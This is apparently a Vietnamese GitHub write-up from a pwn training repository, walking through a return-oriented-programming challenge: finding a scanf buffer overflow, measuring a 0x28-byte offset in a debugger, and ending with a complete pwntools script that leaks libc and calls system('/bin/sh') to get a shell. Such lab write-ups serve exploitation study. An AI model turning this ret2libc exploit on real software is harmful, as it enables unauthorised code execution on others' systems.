# pwn_training
## ROP

![image](https://github.com/TooBunReal/pwn_training/assets/89735990/d6ae2cd6-0782-4e26-b492-b8c6534e6084)

-Đầu tiên mình sẽ vài IDA để check file

![image](https://github.com/TooBunReal/pwn_training/assets/89735990/8613bfa9-f5d4-4973-8bf3-0f8110538719)

![image](https://github.com/TooBunReal/pwn_training/assets/89735990/e9c0c132-04fe-4088-9f06-3b5ec371a97a)

-Ở đây ta thấy chương trình sẽ setbuf nhận hàm một chuỗi input do người dùng nhập vào.
-Tuy nhiên ta có thể thấy chương trình đang sử dụng printf và scanf, rất có thể sẽ bị bufferoverflow.

![image](https://github.com/TooBunReal/pwn_training/assets/89735990/a45b6087-5ab3-4799-a203-d447cb465acc)

-Hàm Vuld là một hàm để nhận input đầu vào.
-Giờ ta sẽ debug thử chương trình.

![image](https://github.com/TooBunReal/pwn_training/assets/89735990/e0416e80-c734-4f0c-b7b3-171bf3f7e39a)

- ta thấy rsi sẽ chứa địa chỉ của buffer.

![image](https://github.com/TooBunReal/pwn_training/assets/89735990/87484473-f798-4cc3-ab59-e391184a10fc)

- ở đây ta sẽ có được giá trị của vararg: 0x7fffffffd5f0

![image](https://github.com/TooBunReal/pwn_training/assets/89735990/7618cf6a-27cb-43dd-862c-e62f5b8543ee)

- sau khi check info fame ta thấy được rip at 0x7fffffffd618.
- trừ 2 giá trị cho nhau ta biết được buffer là 0x28.
- điều này có nghĩa 40 byte đầu là 40 bytes rác ta sẽ fill hết 40 bytes xong sau đó anh truyền payload cái rop của mình vào là được.

![image](https://github.com/TooBunReal/pwn_training/assets/89735990/6fcc5868-45bf-4af3-a9f5-42049507c2af)


- mình sẽ sử dùng tool ROPgadget để lấy gadget pop rdi; ret trong libc.
  ```ROPgadget --binary /usr/lib/libc.so.6 | grep "pop rdi ; ret"```
- tới đây mình tiến hành tìm các giá trị cần thiết cho payload.
- và đây là payload hoàn chỉnh.

```py
from pwn import *

e = context.binary = ELF("./rop")
r = e.process()
libc = e.libc

r.recvuntil(b'Here is your gift: ')
libc.address = int(r.recvline()[:-1], 16) - libc.sym['puts']

print(hex(libc.address))

rdi = libc.address + 0x000000000002a3e5  # pop rdi ; ret
bin_sh = next(libc.search(b'/bin/sh'))  # rdi -> "/bin/sh"
ret = rdi + 1  # ret ( Make rsp % 0x10 == 0)
system = libc.sym['system']

pl = b'A' * 0x28  # Fill the buffer
pl += p64(rdi) + p64(bin_sh) + p64(ret) + p64(system)

r.sendline(pl)
r.interactive()

```

![image](https://github.com/TooBunReal/pwn_training/assets/89735990/ccf68fc7-34a4-4ad6-8001-3691bbb33191)


